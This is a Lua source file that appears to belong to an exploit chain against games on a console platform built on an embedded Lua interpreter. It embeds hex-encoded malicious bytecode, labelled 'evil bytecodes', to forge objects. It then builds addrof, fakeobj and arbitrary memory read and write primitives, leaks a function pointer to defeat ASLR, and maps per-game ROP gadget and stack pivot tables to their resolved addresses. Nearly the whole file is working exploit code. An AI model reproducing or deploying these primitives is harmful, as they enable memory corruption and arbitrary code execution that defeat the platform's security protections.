
--
-- lua class
--
-- provide read and limited write primitives
--

lua_types = {
    LUA_TNIL = 0,
    LUA_TBOOLEAN = 1,
    LUA_TLIGHTUSERDATA = 2,
    LUA_TNUMBER = 3,
    LUA_TSTRING = 4,
    LUA_TTABLE = 5,
    LUA_TFUNCTION = 6,
    LUA_TUSERDATA = 7,
    LUA_TTHREAD = 8
}

fakeobj_lclosure_bc = [[
    1b4c756151000104080408000b0000000000000040626367656e2e6c756100430000005100000000
    01000407000000a400000000000001000000009c808000c10000009e0080011e0080000100000003
    0000000000e494400100000000000000000000004500000050000000020000020700000024000000
    04000000040080001c408000010000001e0000011e00800001000000030000000000004540010000
    0000000000000000004600000049000000020000020300000004008000080000001e008000000000
    00000000000300000048000000480000004900000000000000020000000700000000000000746172
    676574000800000000000000636c6f73757265000700000049000000490000004900000049000000
    4d0000004d0000005000000000000000020000000700000000000000746172676574000800000000
    000000636c6f73757265000700000050000000500000005000000050000000500000005000000051
    000000020000000800000000000000636c6f73757265000000000006000000070000000000000074
    617267657400000000000600000000000000
]]

write_upval_bc = [[
    1b4c756151000104080408000b0000000000000040626367656e2e6c756100550000006000000000
    02000606000000e4000000000080010001000040018000dc4080011e008000000000000100000000
    00000000000000570000005f0000000102000406000000a400000004000000c00000009c40000148
    0000001e00800000000000010000000000000000000000580000005b000000010100020200000008
    0000001e0080000000000000000000020000005a0000005b00000001000000080000000000000063
    6c6f7375726500000000000100000001000000070000000000000074617267657400060000005b00
    00005b0000005b0000005b0000005e0000005f000000020000000800000000000000636c6f737572
    65000000000005000000060000000000000076616c75650000000000050000000100000007000000
    0000000074617267657400060000005f0000005f0000005f0000005f0000005f0000006000000003
    0000000800000000000000636c6f73757265000000000005000000060000000000000076616c7565
    000000000005000000070000000000000074617267657400000000000500000000000000
]]



lua = {}

function lua.setup_primitives()
    
    -- evil bytecodes
    lua.fakeobj_closure = load_bytecode(fakeobj_lclosure_bc)
    lua.write_upval = load_bytecode(write_upval_bc)

    lua.setup_initial_read_primitive()  -- one small step
    lua.resolve_address()  -- break aslr and resolve offsets
    lua.setup_victim_table()  -- setup better addrof primitive  
end

-- allocate a limited length string with a known address
function lua.create_str_hacky(data)

    assert(#data <= 39)
    
    local prev_t1, prev_t2 = {}, {}
    local str, addr = nil, nil

    for i=1,16 do
        collectgarbage()
        local t = {}
        local l, s = nil, nil

        if i % 2 == 0 then
            for j=1,5 do t[j] = {} end
            s = data .. string.rep("\0", (39 - #data))
        else
            s = data .. string.rep("\0", (39 - #data))
            for j=1,5 do t[j] = {} end
        end

        prev_t1[i] = lua.addrof_trivial(t[1])
        prev_t2[i] = lua.addrof_trivial(t[2])
        
        if i >= 3 then
            if prev_t1[i-1] == prev_t1[i-2] then
                str, addr = s, prev_t1[i-1]
                break
            elseif prev_t2[i-1] == prev_t2[i-2] then
                str, addr = s, prev_t2[i-1]
                break
            end
        end
    end

    if not (str and addr) then
        error("failed to leak string addr")
    end

    return str, addr
end

function lua.create_str(str)
    local addr = lua.addrof(str)
    if not addr then
        str, addr = lua.create_str_hacky(str)
    end
    return str, addr+24
end

function lua.setup_initial_read_primitive()
    
    local fake_str_size = 0x100000001337

    -- next + tt/marked/extra/padding/hash + len
    lua.fake_str, lua.fake_str_addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(fake_str_size))
    lua.fake_str = lua.fakeobj(lua.fake_str_addr, lua_types.LUA_TSTRING)

    if bit32.band(#lua.fake_str, 0xffff) ~= 0x1337 then
        error("failed to create fake string obj")
    end
end

function lua.setup_better_read_primitive()

    -- setup fake string at first eboot segment we can read
    local new_fake_str_addr = eboot_addrofs.fake_string

    -- if current fake str is already behind eboot segment, then do nothing
    if new_fake_str_addr > lua.fake_str_addr then
        return
    end

    lua.fake_str = lua.fakeobj(new_fake_str_addr, lua_types.LUA_TSTRING)
    lua.fake_str_addr = new_fake_str_addr
end

function lua.resolve_game(luaB_auxwrap)
    
    print("[+] luaB_auxwrap @ " .. hex(luaB_auxwrap))

    local nibbles = bit64.band(luaB_auxwrap, 0xfff):tonumber()
    print("[+] luaB_auxwrap nibbles: " .. hex(nibbles))
    
    game_name = games_identification[nibbles]

    if not game_name then
        errorf("unsupported game (luaB_auxwrap nibbles: %s)", hex(nibbles))
    end
    
    if game_name == "RaspberryCube" then
        print("[+] Game identified as Raspberry Cube")
        eboot_addrofs = gadget_table.raspberry_cube.eboot_addrofs
        libc_addrofs = gadget_table.raspberry_cube.libc_addrofs
        gadgets = gadget_table.raspberry_cube.gadgets
    elseif game_name == "Aibeya" then
        print("[+] Game identified as Aibeya/G")
        eboot_addrofs = gadget_table.aibeya.eboot_addrofs
        libc_addrofs = gadget_table.aibeya.libc_addrofs
        gadgets = gadget_table.aibeya.gadgets
    elseif game_name == "Aikagi2" then
        print("[+] Game identified as Aikagi 2")
        eboot_addrofs = gadget_table.aikagi_2.eboot_addrofs
        libc_addrofs = gadget_table.aikagi_2.libc_addrofs
        gadgets = gadget_table.aikagi_2.gadgets
    elseif game_name == "HamidashiCreative" then
        print("[+] Game identified as Hamidashi Creative")
        eboot_addrofs = gadget_table.hamidashi_creative.eboot_addrofs
        libc_addrofs = gadget_table.hamidashi_creative.libc_addrofs
        gadgets = gadget_table.hamidashi_creative.gadgets
    elseif game_name == "AikagiKimiIsshoniPack" then
        print("[+] Game identified as Aikagi Kimi to Issho ni Pack")
        eboot_addrofs = gadget_table.aikagi_kimi_isshoni_pack.eboot_addrofs
        libc_addrofs = gadget_table.aikagi_kimi_isshoni_pack.libc_addrofs
        gadgets = gadget_table.aikagi_kimi_isshoni_pack.gadgets
    elseif game_name == "C" then -- TODO: Test
        print("[+] Game identified as C/D")
        eboot_addrofs = gadget_table.c.eboot_addrofs
        libc_addrofs = gadget_table.c.libc_addrofs
        gadgets = gadget_table.c.gadgets
    elseif game_name == "E" then -- TODO: Test
        print("[+] Game identified as E")
        eboot_addrofs = gadget_table.e.eboot_addrofs
        libc_addrofs = gadget_table.e.libc_addrofs
        gadgets = gadget_table.e.gadgets
    elseif game_name == "IxSHETell" then
        print("[+] Game identified as IxSHE Tell")
        eboot_addrofs = gadget_table.ixshe_tell.eboot_addrofs
        libc_addrofs = gadget_table.ixshe_tell.libc_addrofs
        gadgets = gadget_table.ixshe_tell.gadgets
    elseif game_name == "NoraPrincess" then
        print("[+] Game identified as CUSA13303 Nora Princess and Stray Cat Heart HD")
        eboot_addrofs = gadget_table.nora_princess.eboot_addrofs
        libc_addrofs = gadget_table.nora_princess.libc_addrofs
        gadgets = gadget_table.nora_princess.gadgets
    elseif game_name == "JinkiResurrection" then
        print("[+] Game identified as Jinki Resurrection")
        eboot_addrofs = gadget_table.jinki_resurrection.eboot_addrofs
        libc_addrofs = gadget_table.jinki_resurrection.libc_addrofs
        gadgets = gadget_table.jinki_resurrection.gadgets
    elseif game_name == "FuyuKiss" then
        print("[+] Game identified as Fuyu Kiss")
        eboot_addrofs = gadget_table.fuyu_kiss.eboot_addrofs
        libc_addrofs = gadget_table.fuyu_kiss.libc_addrofs
        gadgets = gadget_table.fuyu_kiss.gadgets
    end
end

function lua.resolve_address()

    local luaB_auxwrap = nil
    local consume = {}
    
    for i=1,1024 do

        local co = coroutine.wrap(function() end)
        consume[i] = co

        -- read f field of CClosure (luaB_auxwrap)
        local addr = memory.read_qword(lua.addrof(co)+0x20)
        if addr then
            -- calculate eboot base from luaB_auxwrap offset
            luaB_auxwrap = addr
            break
        end
    end
    
    if not luaB_auxwrap then
        error("failed to leak luaB_auxwrap")
    end
    
    lua.resolve_game(luaB_auxwrap)
    
    eboot_base = luaB_auxwrap - eboot_addrofs.luaB_auxwrap
    print("[+] eboot base @ " .. hex(eboot_base))

    -- resolve offsets to their address
    for k,v in pairs(gadgets) do
        if k == "stack_pivot" then
            local list = {}
            for name, offset in pairs(v) do
                local info = {}
                info.gadget_addr = eboot_base + offset
                info.pivot_addr = uint64(name:match("(0x%x+)"))
                info.pivot_base = bit64.band(info.pivot_addr, bit64.bnot(0xfff))
                table.insert(list, info)
            end
            gadgets[k] = list
        else
            gadgets[k] = eboot_base + v
        end
    end

    for k,offset in pairs(eboot_addrofs) do 
        eboot_addrofs[k] = eboot_base + offset 
    end
	
    -- setup fake string that can read more memory space
    lua.setup_better_read_primitive()

    -- resolve libc
    libc_base = memory.read_qword(eboot_addrofs.longjmp_import) - libc_addrofs.longjmp
    print("[+] libc base @ " .. hex(libc_base))
    
    for k,offset in pairs(libc_addrofs) do 
        libc_addrofs[k] = libc_base + offset 
    end
end

-- setup a table where we can read its array buffer
function lua.setup_victim_table()
    local t = { 1, 2, 3, 4 }
    local array_addr = memory.read_qword(lua.addrof(t)+24)
    if array_addr then
        if memory.read_buffer(array_addr, 1) then  -- test if we can read the buffer
            lua.tbl_victim, lua.tbl_victim_array_addr = t, array_addr
        end
    end
    if not (lua.tbl_victim and lua.tbl_victim_array_addr) then
        error("failed to find victim table")
    end
end

function lua.get_table_value(obj)
    if not lua.tbl_victim then return nil end
    lua.tbl_victim[1] = obj
    return memory.read_qword(lua.tbl_victim_array_addr)
end

function lua.fake_table_value(obj_addr, ttype)
    if not lua.tbl_victim then return nil end
    memory.write_qword(lua.tbl_victim_array_addr + 0x20, obj_addr)
    memory.write_qword(lua.tbl_victim_array_addr + 0x28, ttype)
    return lua.tbl_victim[3]
end

function lua.fakeobj_through_closure(obj_addr, ttype)
    local addr, fake_tvalues, fake_proto, fake_closure
    fake_tvalues, addr = lua.create_str(ub8(obj_addr) .. ub8(ttype))  -- value + ttype
    fake_proto, addr = lua.create_str(ub8(0x0) .. ub8(0x0) .. ub8(addr))  -- next + tt/marked + k
    fake_closure, _ = lua.create_str(ub8(0x0) .. ub8(addr))  -- env + proto
    return lua.fakeobj_closure(fake_closure)
end

function lua.addrof_trivial(x)
    local addr = tostring(x):match("^%a+:? 0?x?%(?(%x+)%)?$")
    return addr and uint64("0x" .. addr) or nil
end

function lua.addrof(obj)
    return lua.get_table_value(obj) or lua.addrof_trivial(obj)
end

function lua.resolve_value(v)
    if type(v) == "string" then
        return lua.addrof(v)+24
    elseif type(v) == "number" then
        return uint64(v)
    elseif is_uint64(v) then
        return v
    end
    errorf("lua.resolve_value: invalid type (%s)", type(v))
end

function lua.fakeobj(obj_addr, ttype)
    return lua.fake_table_value(obj_addr, ttype) or lua.fakeobj_through_closure(obj_addr, ttype)
end

function lua.read_buffer(addr, size)
    if not lua.fake_str then return nil end
    size = uint64(size):tonumber()
    -- check if addr to read is after fake string addr
    local rel_addr = (uint64(addr) - (lua.fake_str_addr + 23)):tonumber()
    return rel_addr >= 0 and lua.fake_str:sub(rel_addr, rel_addr + size - 1) or nil 
end

-- write 8 bytes (double) at target address with 4 bytes corruption after addr+8
function lua.write_double(addr, value)
    local fake_upval = ub8(0x0) .. ub8(0x0) .. ub8(addr)  -- next + tt/marked + addr to tvalue
    local fake_closure = ub8(0x0) .. ub8(lua.addrof("0")) .. ub8(lua.resolve_value(fake_upval))  -- env + proto + upvals
    lua.write_upval(fake_closure, value)
end

-- write 8 bytes (qword) at target address with 5 bytes corruption after addr+8
function lua.write_qword(addr, value)
    local setbit = bit64.lshift(1, 56)
    value = uint64(value)
    lua.write_double(addr, struct.unpack("<d", ub8(value + setbit)))
    lua.write_double(addr+1, struct.unpack("<d", ub8(bit64.rshift(value, 8) + setbit)))
end

function lua.create_fake_cclosure(addr)
    
    -- next + tt/marked/isC/nupvalues/hole + gclist + env + f
    local fake_cclosure = ub8(0) .. "\6\0\1\0\0\0\0\0" .. ub8(0) .. ub8(0) .. ub8(addr)

    -- create a copy so gc wont freed the memory backing of the object
    local mem = memory.alloc(#fake_cclosure)
    memory.memcpy(mem, lua.resolve_value(fake_cclosure), #fake_cclosure)

    return lua.fakeobj(mem, lua_types.LUA_TFUNCTION)
end


--
-- bump allocator class
--
-- provide initial memory allocation which is backed by lua string
--

bump = {}

bump.pool_size = 512 * 1024  -- 512 kb

function bump.init()
    local padding = align_16(24) -- offset to data
    bump.lua_backing = string.rep("\0", bump.pool_size + padding)
    bump.pool_base = lua.addrof(bump.lua_backing) + padding
    bump.pool_current = bump.pool_base
end

function bump.alloc(size)

    assert(type(size) == "number")

    -- init for first time
    if not bump.pool_base then
        bump.init()
    end

    if bump.pool_current + size >= bump.pool_base + bump.pool_size then
        error("bump allocator exhausted")
    end

    local addr = bump.pool_current
    bump.pool_current = bump.pool_current + size
    return addr
end
